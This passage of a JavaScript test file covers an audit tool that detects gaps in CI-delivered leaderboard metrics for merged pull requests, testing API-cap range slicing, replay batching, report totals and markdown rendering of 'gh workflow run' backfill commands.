      subdivided++;
      return 1500;
    },
    runs: () => [{ id: 1, head_sha: 'a' }, { id: 2, head_sha: 'b' }],
  });

  return runsInRange(client, { ...RCFG, since: '2026-07-01' }, 'guard').then((got) => {
    assert.ok(subdivided > 0, 'the over-cap range must have been subdivided');
    // Every day between since and now got its own slice, and all their runs are
    // in the output — nothing was dropped by the recursion.
    assert.equal(got.length, client.seen.pages.length * 2);
    assert.ok(client.seen.pages.length > 1, 'subdivision must produce several slices');
    // No slice is ever fetched twice — a stack bug would double-count runs.
    assert.equal(new Set(client.seen.pages).size, client.seen.pages.length);
  });
});

test('SLICE_MAX leaves a margin below API_CAP, or the shortfall check is blind', () => {
  // The shortfall check is `got.length < total`, and `got.length` is itself
  // CLAMPED to API_CAP — so it can never exceed it. If a slice were allowed to
  // probe AT the cap, one run arriving before the fetch would return a clamped
  // 1000 and `1000 < 1000` is false: silently dropped, which is the exact failure
  // class this whole mechanism exists to prevent. The margin is what makes
  // between-probe-and-fetch growth observable instead of clamped away.
  assert.ok(SLICE_MAX < API_CAP, 'a slice threshold at the cap cannot detect truncation');

  // And the margin has to exceed a plausible amount of churn during one audit,
  // not merely be nonzero — guard merges on the order of 30 runs/day.
  assert.ok(API_CAP - SLICE_MAX >= 100, 'the margin must absorb real between-probe churn');
});

test('runsInRange: a slice OVER SLICE_MAX but under the hard cap still subdivides', () => {
  // The regression test for the boundary itself. A total of 950 is under the
  // API's 1000 cap, so the pre-fix code fetched it in one go and could not tell a
  // clamped result from a complete one. It must subdivide instead.
  // 950, expressed against API_CAP and NOT against SLICE_MAX: deriving it from
  // the threshold under test would make the fixture move with the bug, so
  // lowering SLICE_MAX back to the cap would keep this test green. Tying it to
  // the API's hard cap — a fact about GitHub, not a tunable — keeps it honest.
  const OVER = API_CAP - 50;
  assert.ok(OVER > SLICE_MAX && OVER < API_CAP, 'fixture must sit between the threshold and the cap');

  let sawWideProbe = false;
  const client = stubClient({
    total: (range) => {
      const [a, b] = range.split('..');
      if (a === b) return 2;
      sawWideProbe = true;
      return OVER;
    },
    runs: () => [{ id: 1, head_sha: 'a' }, { id: 2, head_sha: 'b' }],
  });

  return runsInRange(client, { ...RCFG, since: '2026-07-28' }, 'guard').then((got) => {
    assert.ok(sawWideProbe, 'the multi-day range must have been probed');
    assert.ok(client.seen.pages.length > 1, 'a 950-run range must be split, not fetched whole');
    // Every fetched slice was a single day, i.e. it recursed all the way down
    // rather than fetching the 950 as one page set.
    for (const range of client.seen.pages) {
      const [a, b] = range.split('..');
      assert.equal(a, b, `slice ${range} should have been subdivided further`);
    }
    assert.equal(got.length, client.seen.pages.length * 2);
  });
});

test('runsInRange: a fetch that REACHES the hard cap is rejected as untrustworthy', () => {
  // The other end of the same property. A slice is only fetched after probing at
  // or below SLICE_MAX, so coming back with API_CAP results means it grew by at
  // least the whole margin since the probe — and a result set sitting exactly on
  // the cap is indistinguishable from one clamped BY the cap. Tolerating growth
  // (which the shortfall test deliberately does) must not extend to tolerating a
  // result that may be truncated.
  const client = stubClient({
    total: () => SLICE_MAX,
    runs: () => Array.from({ length: API_CAP }, (_, i) => ({ id: i, head_sha: `s${i}` })),
  });

  return assert.rejects(
    () => runsInRange(client, RCFG, 'guard'),
    /reaching the API's 1000-result cap — the result set may be clamped/,
  );
});

test('runsInRange: a SINGLE DAY over the cap throws rather than reporting what it can see', () => {
  // Day is the floor the `created` filter supports, so this is unrepresentable.
  // Reporting the visible subset would invent gaps for the rest.
  const client = stubClient({ total: () => 1500, runs: () => [] });

  return assert.rejects(
    () => runsInRange(client, { ...RCFG, since: ymdToday() }, 'guard'),
    /exceeds the safe slice size of 900 .*and cannot be subdivided further/,
  );
});

function ymdToday() {
  return new Date().toISOString().slice(0, 10);
}

// ── chunk ────────────────────────────────────────────────────────────────────

test('chunk: splits into batches of at most n, losing and duplicating nothing', () => {
  assert.deepEqual(chunk([1, 2, 3, 4, 5], 2), [[1, 2], [3, 4], [5]]);
  assert.deepEqual(chunk([], 3), []);
  assert.deepEqual(chunk([1, 2, 3], 3), [[1, 2, 3]]);
  assert.deepEqual(chunk([1, 2, 3], 10), [[1, 2, 3]]);

  const big = Array.from({ length: 501 }, (_, i) => i + 1);
  const out = chunk(big, REPLAY_BATCH);
  assert.equal(out.length, 3);
  assert.deepEqual(out.map((b) => b.length), [250, 250, 1]);
  assert.deepEqual(out.flat(), big);
});

test('REPLAY_BATCH stays UNDER the backfill workflow matrix cap of 256', () => {
  // Not a tautology against the impl: 256 is the cap the backfill enforces
  // itself, quoted from leaderboard-backfill.yml's own guard, and a batch AT
  // the cap is one bad edge away from being refused.
  assert.ok(REPLAY_BATCH < 256, `REPLAY_BATCH=${REPLAY_BATCH} must be < 256`);
});

// ── replayList ───────────────────────────────────────────────────────────────

test('replayList: unions failed + never_fired + skipped_anomaly, sorted NUMERICALLY', () => {
  // The fixture is chosen so three different implementations give three
  // different answers:
  //   correct (numeric sort) → [9, 10, 100]
  //   no sort at all         → [100, 9, 10]   (concatenation order)
  //   default lexicographic  → [10, 100, 9]
  const classes = {
    delivered: [rec(1), rec(2)],
    failed: [rec(100)],
    never_fired: [rec(9)],
    skipped_anomaly: [rec(10)],
    pre_onboarding: [rec(3)],
  };

  assert.deepEqual(replayList(classes), [9, 10, 100]);
});

test('replayList: delivered and pre_onboarding are never replayed', () => {
  const classes = {
    delivered: [rec(1), rec(2), rec(3)],
    failed: [],
    never_fired: [],
    skipped_anomaly: [],
    pre_onboarding: [rec(4), rec(5)],
  };

  assert.deepEqual(replayList(classes), []);
});

test('replayList: an in_flight pr is NOT replayed', () => {
  // The whole point of the in_flight class. A delivery that is still running
  // would be double-delivered by a replay, and consumer-side idempotency is not
  // established — so an unconcluded run must not reach this list, even though
  // it has not delivered anything yet.
  const classes = {
    delivered: [],
    failed: [rec(50)],
    never_fired: [],
    skipped_anomaly: [],
    pre_onboarding: [],
    in_flight: [rec(1), rec(2), rec(3)],
  };

  // 50 is present, proving the list is not empty for an unrelated reason.
  assert.deepEqual(replayList(classes), [50]);
});

test('replayList: sorts across all three replayable classes together', () => {
  const classes = {
    delivered: [],
    failed: [rec(30), rec(2)],
    never_fired: [rec(11), rec(1)],
    skipped_anomaly: [rec(200), rec(3)],
    pre_onboarding: [],
  };

  assert.deepEqual(replayList(classes), [1, 2, 3, 11, 30, 200]);
});

// ── renderMarkdown ───────────────────────────────────────────────────────────

const CFG = {
  owner: 'praetorian-inc',
  backfillCaller: 'leaderboard-backfill-caller.yml',
};

const gapReport = ({
  hasCaller = true,
  replay = [9, 10, 100],
  preOnboarding = 0,
  inFlight = 0,
} = {}) => ({
  since: '2026-07-05',
  totals: { merged_prs: 12, delivered: 9, in_flight: inFlight },
  repos_with_gaps: [
    {
      repo: 'guard',
      failed: 1,
      never_fired: 1,
      skipped_anomaly: 1,
      pre_onboarding: preOnboarding,
      in_flight: inFlight,
      replay,
    },
  ],
  repos: [{ repo: 'guard', has_caller: hasCaller }],
});

test('renderMarkdown: emits the no-caller callout only when has_caller is false', () => {
  const withoutCaller = renderMarkdown(gapReport({ hasCaller: false }), CFG);
  assert.match(withoutCaller, /has no `leaderboard-metrics\.yml` caller/);
  assert.match(withoutCaller, /never-fired delivery, not a failure/);

  const withCaller = renderMarkdown(gapReport({ hasCaller: true }), CFG);
  assert.doesNotMatch(withCaller, /has no `leaderboard-metrics\.yml` caller/);
  // Everything else about the two renders is the same, so the assertions above
  // are about the callout and nothing else.
  assert.match(withCaller, /### `guard`/);
  assert.match(withCaller, /A leaderboard metrics delivery gap was detected/);
});

test('renderMarkdown: the replay command carries the comma-joined PR numbers', () => {
  const md = renderMarkdown(gapReport({ replay: [9, 10, 100] }), CFG);

  assert.match(
    md,
    /gh workflow run leaderboard-backfill-caller\.yml --repo praetorian-inc\/guard/,
  );
  assert.match(md, /-f pr_numbers='9,10,100'/);
  // The human-readable list is separate from the command and must agree.
  assert.match(md, /Affected PRs \(3\): #9, #10, #100/);
});

test('renderMarkdown: the replay command honours a custom backfill caller and owner', () => {
  const md = renderMarkdown(gapReport(), { owner: 'acme', backfillCaller: 'other.yml' });

  assert.match(md, /gh workflow run other\.yml --repo acme\/guard/);
  assert.doesNotMatch(md, /leaderboard-backfill-caller\.yml/);
});

test('renderMarkdown: per-class counts are tabulated, pre-onboarding only when nonzero', () => {
  const withPre = renderMarkdown(gapReport({ preOnboarding: 4 }), CFG);
  assert.match(withPre, /\| pre-onboarding \(not a gap\) \| 4 \|/);

  const withoutPre = renderMarkdown(gapReport({ preOnboarding: 0 }), CFG);
  assert.doesNotMatch(withoutPre, /pre-onboarding/);

  // The three gap classes are always tabulated.
  assert.match(withoutPre, /\| failed \| 1 \|/);
  assert.match(withoutPre, /\| never fired \| 1 \|/);
  assert.match(withoutPre, /\| skipped anomaly \| 1 \|/);
});

test('renderMarkdown: a replay list over the matrix cap is split into dispatchable batches', () => {
  // The backfill fans out one matrix job per PR and refuses any run over 256,
  // so a single command for 600 PRs is one the report already knows will bounce.
  const replay = Array.from({ length: 600 }, (_, i) => i + 1);
  const md = renderMarkdown(gapReport({ replay }), CFG);

  const cmds = md.match(/gh workflow run/g) ?? [];
  assert.equal(cmds.length, 3, '600 PRs at 250 per batch is 3 commands');
  assert.match(md, /exceeds the backfill's 256-job matrix cap/);
  assert.match(md, /split into 3 batches/);

  // Every PR appears exactly once across the batches — a split that drops or
  // repeats entries would under-replay or double-deliver.
  const listed = [...md.matchAll(/-f pr_numbers='([^']+)'/g)]
    .flatMap((m) => m[1].split(',').map(Number))
    .sort((a, b) => a - b);
  assert.deepEqual(listed, replay);

  // No batch exceeds the cap.
  for (const m of md.matchAll(/-f pr_numbers='([^']+)'/g)) {
    assert.ok(m[1].split(',').length <= REPLAY_BATCH);
  }
});

test('renderMarkdown: a replay list under the cap stays ONE command with no batch talk', () => {
  const md = renderMarkdown(gapReport({ replay: [9, 10, 100] }), CFG);

  assert.equal((md.match(/gh workflow run/g) ?? []).length, 1);
  assert.doesNotMatch(md, /matrix cap/);
  assert.doesNotMatch(md, /batches/);
});

test('renderMarkdown: an undecided count is tabulated as NOT a gap, and only when nonzero', () => {
  const running = renderMarkdown(gapReport({ inFlight: 2 }), CFG);
  assert.match(running, /\| not yet decided \(not a gap, not replayed\) \| 2 \|/);
  // It is reported alongside the gaps but excluded from the replay command, so
  // the row must not change what gets replayed.
  assert.match(running, /-f pr_numbers='9,10,100'/);

  const none = renderMarkdown(gapReport({ inFlight: 0 }), CFG);
  assert.doesNotMatch(none, /not yet decided/);
});

test('renderMarkdown: a clean report says No gaps and offers no replay command', () => {
  const clean = {
    since: '2026-07-05',
    totals: { merged_prs: 12, delivered: 12, in_flight: 0 },
    repos_with_gaps: [],
    repos: [{ repo: 'guard', has_caller: true }],
  };

  const md = renderMarkdown(clean, CFG);

  assert.match(md, /No gaps\. Every merged PR in the window has a successful metrics delivery\./);
  assert.doesNotMatch(md, /gh workflow run/);
  assert.doesNotMatch(md, /pr_numbers/);
  assert.doesNotMatch(md, /delivery gap was detected/);
  // The window header still reports what was examined.
  assert.match(md, /Window `2026-07-05` → now/);
  assert.match(md, /Merged PRs examined: \*\*12\*\*/);
  assert.match(md, /Delivered: \*\*12\*\*/);
});

test('renderMarkdown: a clean report with a run still in flight does NOT claim every PR delivered', () => {
  // "Every merged PR delivered successfully" would be a FALSE sentence while a
  // delivery is undecided — and falsely reassuring at exactly the moment it
  // matters. The gap list is empty either way, so only the wording distinguishes
  // "verified clean" from "clean so far, two still unknown".
  const cleanButRunning = {
    since: '2026-07-05',
    totals: { merged_prs: 12, delivered: 10, in_flight: 2 },
    repos_with_gaps: [],
    repos: [{ repo: 'guard', has_caller: true }],
  };

  const md = renderMarkdown(cleanButRunning, CFG);

  assert.match(md, /No gaps\./);
  assert.match(md, /\*\*2\*\* merged PR\(s\) are not yet decided/);
  assert.match(md, /Re-run the audit once they settle/);
  // in_flight has TWO causes and the prose must name both, or a reader takes
  // "still running" literally and treats a just-merged PR with no run row as
  // something other than the undecided case it is.
  assert.match(md, /still running/);
  assert.match(md, /merged too recently for\s+its run to exist yet/);
  // The unqualified claim must be absent — this is the assertion the bug fails.
  assert.doesNotMatch(md, /No gaps\. Every merged PR in the window has a successful metrics delivery\./);
  // Still no replay is offered: an in-flight delivery is not replayable.
  assert.doesNotMatch(md, /gh workflow run/);
});

// ── buildReport ──────────────────────────────────────────────────────────────

test('buildReport: totals sum every class across repos', () => {
  const results = [
    // Each repo's per-class counts add up to its merged count, so a class the
    // sum forgets shows up as a total that does not reconcile.
    repoResult('guard', {
      merged: 12,
      delivered: [rec(1), rec(2), rec(3)],
      failed: [rec(4)],
      never_fired: [rec(5), rec(6)],
      skipped_anomaly: [rec(7)],
      pre_onboarding: [rec(8), rec(9), rec(10)],
      in_flight: [rec(11)],
      payload_missing: [rec(12)],
    }),
    repoResult('palatine', {
      merged: 8,
      delivered: [rec(20)],
      failed: [rec(21), rec(22)],
      never_fired: [],
      skipped_anomaly: [],
      pre_onboarding: [rec(23)],
      in_flight: [rec(24), rec(25)],
      payload_missing: [rec(26), rec(27)],
    }),
  ];

  const report = buildReport(results, { since: '2026-07-05', selfAudit: false }, 137);

  // Hand-summed: 12+8, 3+1, 1+2, 2+0, 1+0, 3+1, 1+2, 1+2. deepEqual rather than
  // per-key: an added class that nothing sums is exactly the drift to catch —
  // and it caught payload_missing when that class was added.
  assert.deepEqual(report.totals, {
    merged_prs: 20,
    delivered: 4,
    failed: 3,
    never_fired: 2,
    skipped_anomaly: 1,
    pre_onboarding: 4,
    in_flight: 3,
    payload_missing: 3,
  });
  // Cross-check: every merged PR is accounted for by exactly one class.
  const { merged_prs: m, ...classes } = report.totals;
  assert.equal(Object.values(classes).reduce((a, b) => a + b, 0), m);
  assert.equal(report.fleet_size, 2);
  assert.equal(report.api_calls, 137);
  assert.equal(report.since, '2026-07-05');
  assert.equal(report.mode, 'fleet');
});

test('buildReport: mode reflects selfAudit', () => {
  const results = [repoResult('guard', { merged: 1, delivered: [rec(1)] })];
  assert.equal(buildReport(results, { since: '2026-07-05', selfAudit: true }, 1).mode, 'self');
  assert.equal(buildReport(results, { since: '2026-07-05', selfAudit: false }, 1).mode, 'fleet');
});

test('buildReport: a pre-onboarding-ONLY repo is not a repo with gaps', () => {
  // This is the difference between a useful detector and one that cries wolf.
  // guard-like repo: everything undelivered is pre-onboarding → no alert.
  // palatine-like repo: one real failure → alert.
  const results = [
    repoResult('pre-onboarding-only', {
      merged: 8,
      delivered: [rec(1), rec(2)],
      pre_onboarding: [rec(3), rec(4), rec(5), rec(6), rec(7), rec(8)],
    }),
    repoResult('really-broken', {
      merged: 3,
      delivered: [rec(30), rec(31)],
      failed: [rec(32)],
    }),
  ];

  const report = buildReport(results, { since: '2026-07-05', selfAudit: false }, 1);

  assert.deepEqual(
    report.repos_with_gaps.map((g) => g.repo),
    ['really-broken'],
  );
  // The pre-onboarding PRs are still COUNTED — they are reported, just not
  // alerted on. Suppressing them from totals would hide the backfill decision.
  assert.equal(report.totals.pre_onboarding, 6);
  assert.equal(report.fleet_size, 2);
});

test('buildReport: each of the three gap classes alone is enough to raise a gap', () => {
  for (const cls of ['failed', 'never_fired', 'skipped_anomaly']) {
    const report = buildReport(
      [repoResult('r', { merged: 1, [cls]: [rec(1)] })],
      { since: '2026-07-05', selfAudit: true },
      1,
    );
    assert.deepEqual(
      report.repos_with_gaps.map((g) => g.repo),
      ['r'],
      `${cls} alone should raise a gap`,
    );
  }
});

test('buildReport: an all-delivered fleet has no gaps at all', () => {
  const report = buildReport(
    [
      repoResult('a', { merged: 2, delivered: [rec(1), rec(2)] }),
      repoResult('b', { merged: 1, delivered: [rec(3)] }),
    ],
    { since: '2026-07-05', selfAudit: false },
    5,
  );

  assert.deepEqual(report.repos_with_gaps, []);
  assert.equal(report.totals.delivered, 3);
  assert.equal(report.totals.merged_prs, 3);
});

test('buildReport: a gap entry carries the per-class counts and the numeric replay list', () => {
  const report = buildReport(
    [
      repoResult('guard', {
        merged: 6,
        failed: [rec(100)],
        never_fired: [rec(9)],
        skipped_anomaly: [rec(10)],
        pre_onboarding: [rec(1)],
        in_flight: [rec(2)],
        payload_missing: [rec(50)],
      }),
    ],
    { since: '2026-07-05', selfAudit: true },
    1,
  );

  assert.deepEqual(report.repos_with_gaps, [
    {
      repo: 'guard',
      failed: 1,
      never_fired: 1,
      skipped_anomaly: 1,
      pre_onboarding: 1,
      in_flight: 1,
      payload_missing: 1,
      payload_missing_prs: [50],
      replay: [9, 10, 100],
    },
  ]);
  // Reported on the entry, absent from the replay list: #50 ran and succeeded,
  // but enqueued nothing, and replaying it re-delivers nothing.
  assert.equal(report.repos_with_gaps[0].replay.includes(50), false);
  // Reported on the entry, absent from the replay list: #2 is running, not lost.
  assert.equal(report.repos_with_gaps[0].replay.includes(2), false);
});

test('buildReport: an in_flight-ONLY repo is not a repo with gaps', () => {
  // An unconcluded run is an UNKNOWN, not a gap. Raising on it would make the
  // audit's verdict depend on how close it happened to run to a merge — the same
  // repo would alert or not alert depending on the minute the cron fired.
  const results = [
    repoResult('mid-flight', {
      merged: 3,
      delivered: [rec(1), rec(2)],
      in_flight: [rec(3)],
    }),
    repoResult('really-broken', { merged: 1, failed: [rec(30)] }),
  ];

  const report = buildReport(results, { since: '2026-07-05', selfAudit: false }, 1);

  assert.deepEqual(
    report.repos_with_gaps.map((g) => g.repo),
    ['really-broken'],
  );
  // Counted and reported, just not alerted on.
  assert.equal(report.totals.in_flight, 1);
});

test('buildReport output feeds renderMarkdown without shape drift', () => {
  // Guards the seam between the two exports: renderMarkdown reads
  // report.repos[].has_caller and report.repos_with_gaps[].replay, both of
  // which buildReport is responsible for producing.
  const results = [
    {
      ...repoResult('guard', { merged: 3, delivered: [rec(1)], never_fired: [rec(9), rec(10)] }),
      has_caller: false,
    },
  ];
  const cfg = {
    since: '2026-07-05',
    selfAudit: true,
    owner: 'praetorian-inc',
    backfillCaller: 'leaderboard-backfill-caller.yml',
  };

  const md = renderMarkdown(buildReport(results, cfg, 3), cfg);

  assert.match(md, /### `guard`/);
  assert.match(md, /has no `leaderboard-metrics\.yml` caller/);
  assert.match(md, /-f pr_numbers='9,10'/);
  assert.match(md, /Merged PRs examined: \*\*3\*\*/);
});

// ── assertReadable: a 404 on the REPO must not read as a clean audit ──────────

test('assertReadable: an unreadable repo THROWS instead of yielding a clean report', () => {
  // The dangerous shape, and the reason this is not merely defensive: gh() maps
  // 404 -> {__missing:true} and ghPaged() returns [] on 404, both deliberately,
  // because an absent caller file and an absent commit history are real answers.
  // With no repo-level check, a typo'd --repo makes EVERY endpoint answer 404:
  // zero merged PRs, zero gaps, exit 0 CLEAN.
  const client = { gh: async () => ({ __missing: true }) };
  return assert.rejects(
    () => assertReadable(client, { owner: 'praetorian-inc' }, 'guardd'),
    /praetorian-inc\/guardd: repository not found, or not readable by this token/,
  );
});

test('assertReadable: a readable repo passes and does not disturb the audit', async () => {
  const client = { gh: async () => ({ name: 'guard', archived: false }) };
  const meta = await assertReadable(client, { owner: 'praetorian-inc' }, 'guard');
  assert.equal(meta.name, 'guard');
});

test('assertReadable: a null body is treated as unreadable, not as readable', () => {
  // Distinct from __missing: a 200 with an empty body would sail past a check
  // written as `if (meta.__missing)` and then throw on property access later,
  // far from the cause.
  const client = { gh: async () => null };
  return assert.rejects(
    () => assertReadable(client, { owner: 'praetorian-inc' }, 'guard'),
    /refusing to audit it/,
  );
});

// ── verifyPayloads: a `success` run that enqueued nothing ─────────────────────

// Modelled on guard run 28112331529 (2026-06-24, author `xoverride`): the run
// concluded SUCCESS with "Configure AWS credentials" and "Send metrics to SQS"
// both `skipped`, because no author resolved through ENGINEER_EMAIL_MAP.
const jobsWith = (sqsConclusion) => ({
  jobs: [
    {
      steps: [
        { name: 'Set up job', conclusion: 'success' },
        { name: 'Collect PR metrics', conclusion: 'success' },
        { name: 'Configure AWS credentials', conclusion: sqsConclusion },
        { name: SQS_STEP, conclusion: sqsConclusion },
      ],
    },
  ],
});

const jobsClient = (byRun) => ({
  gh: async (url) => byRun[url.match(/runs\/(\d+)\/jobs/)[1]],
});

test('verifyPayloads: a skipped SQS step is NOT a delivery', async () => {
  const client = jobsClient({ 111: jobsWith('skipped'), 222: jobsWith('success') });
  const v = await verifyPayloads(client, { owner: 'praetorian-inc' }, 'guard', [
    { number: 1, run_id: 111 },
    { number: 2, run_id: 222 },
  ]);
  assert.equal(v.get(111), 'not_sent');
  assert.equal(v.get(222), 'sent');
});

test('verifyPayloads: a MISSING step name throws rather than defaulting to delivered', () => {
  // The fail-open this fix exists to close, one layer up: a name probe that
  // answers "fine" when it finds nothing has the same shape as the bug. A
  // rename of the reusable's step must stop the audit (exit 2 UNKNOWN), not
  // silently restore "every success is a delivery".
  const client = jobsClient({ 333: { jobs: [{ steps: [{ name: 'Send to SQS', conclusion: 'success' }] }] } });
  return assert.rejects(
    () => verifyPayloads(client, { owner: 'praetorian-inc' }, 'guard', [{ number: 3, run_id: 333 }]),
    /has no step named "Send metrics to SQS"/,
  );
});

test('verifyPayloads: a 404 on the jobs endpoint throws, it does not pass the run', () => {
  // Same reason as above. __missing means the steps could not be read at all,
  // which is not evidence of a delivery.
  const client = jobsClient({ 444: { __missing: true } });
  return assert.rejects(
    () => verifyPayloads(client, { owner: 'praetorian-inc' }, 'guard', [{ number: 4, run_id: 444 }]),
    /has no step named/,
  );
});

test('applyPayloadVerdicts: demotes only the unsent runs and leaves the rest delivered', () => {
  const classes = {
    delivered: [
      { number: 1, run_id: 111 },
      { number: 2, run_id: 222 },
      { number: 3, run_id: 333 },
    ],
    payload_missing: [],
  };
  applyPayloadVerdicts(
    classes,
    new Map([
      [111, 'not_sent'],
      [222, 'sent'],
      [333, 'not_sent'],
    ]),
  );
  assert.deepEqual(
    classes.delivered.map((r) => r.number),
    [2],
  );
  assert.deepEqual(
    classes.payload_missing.map((r) => r.number),
    [1, 3],
  );
  // The record says WHY, so the JSON artifact explains the demotion on its own.
  assert.equal(classes.payload_missing[0].payload, 'missing');
});

test('applyPayloadVerdicts: an empty verdict map leaves every delivery intact', () => {
  // Guards the direction that would be catastrophic: a probe that returned
  // nothing must not demote the whole fleet into a 1000-PR phantom gap.
  const classes = { delivered: [{ number: 1, run_id: 111 }], payload_missing: [] };
  applyPayloadVerdicts(classes, new Map());
  assert.equal(classes.delivered.length, 1);
  assert.equal(classes.payload_missing.length, 0);
});

test('replayList: payload_missing is EXCLUDED — replay cannot fix an unmapped author', () => {
  // Replaying re-runs collect-metrics against the same unresolvable author and
  // enqueues nothing again, while still writing to the prod queue for the other
  // PRs in the batch. The backfill says as much itself. The repair is a map edit.
  const list = replayList({
    failed: [rec(4)],
    never_fired: [rec(5)],
    skipped_anomaly: [],
    payload_missing: [rec(99)],
  });
  assert.deepEqual(list, [4, 5]);
});

test('buildReport: payload_missing alone makes a repo a GAP repo', () => {
  // The class is unreplayable, so keying the gap verdict off the replay list
  // would report a repo whose every defect is unfixable-by-replay as clean.
  const report = buildReport(
    [repoResult('guard', { merged: 2, delivered: [rec(1)], payload_missing: [rec(2)] })],
    { since: '2026-07-01', selfAudit: true, backfillCaller: 'leaderboard-backfill.yml' },
    10,
  );
  assert.equal(report.repos_with_gaps.length, 1);
  assert.equal(report.totals.payload_missing, 1);
  assert.deepEqual(report.repos_with_gaps[0].payload_missing_prs, [2]);
  assert.deepEqual(report.repos_with_gaps[0].replay, [], 'not replayable');
});

test('renderMarkdown: names the map fix and emits NO replay command when that is the only gap', () => {
  const report = buildReport(
    [repoResult('guard', { merged: 2, delivered: [rec(1)], payload_missing: [rec(2)] })],
    { since: '2026-07-01', selfAudit: true, backfillCaller: 'leaderboard-backfill.yml' },
    10,
  );
  const md = renderMarkdown(report, { owner: 'praetorian-inc', backfillCaller: 'leaderboard-backfill.yml' });
  assert.match(md, /ran successfully but sent no payload/);
  assert.match(md, /ENGINEER_EMAIL_MAP/);
  assert.match(md, /Unmapped-author PRs \(1\): #2/);
  // The load-bearing absence: a `-f pr_numbers=''` paste would dispatch a
  // backfill over nothing, and telling someone to replay these is wrong advice.
  assert.doesNotMatch(md, /pr_numbers=/);
  assert.doesNotMatch(md, /Affected PRs \(0\)/);
});

test('renderMarkdown: both a replayable gap and an unmapped-author gap are reported separately', () => {
  const report = buildReport(
    [repoResult('guard', { merged: 3, never_fired: [rec(7)], payload_missing: [rec(8)] })],
    { since: '2026-07-01', selfAudit: true, backfillCaller: 'leaderboard-backfill.yml' },
    10,
  );
  const md = renderMarkdown(report, { owner: 'praetorian-inc', backfillCaller: 'leaderboard-backfill.yml' });
  assert.match(md, /Unmapped-author PRs \(1\): #8/);
  assert.match(md, /Affected PRs \(1\): #7/);
  // #8 must NOT reach the replay command even when a command is emitted for #7.
  assert.match(md, /-f pr_numbers='7'/);
  assert.doesNotMatch(md, /pr_numbers='7,8'/);
});

test('renderMarkdown: the header does not claim a delivery it only inferred from a conclusion', () => {
  const report = buildReport(
    [repoResult('guard', { merged: 1, delivered: [rec(1)] })],
    { since: '2026-07-01', selfAudit: true },
    5,
  );
  const md = renderMarkdown(report, { owner: 'praetorian-inc' });
  assert.match(md, /verified to have actually\s+enqueued a payload/);
});
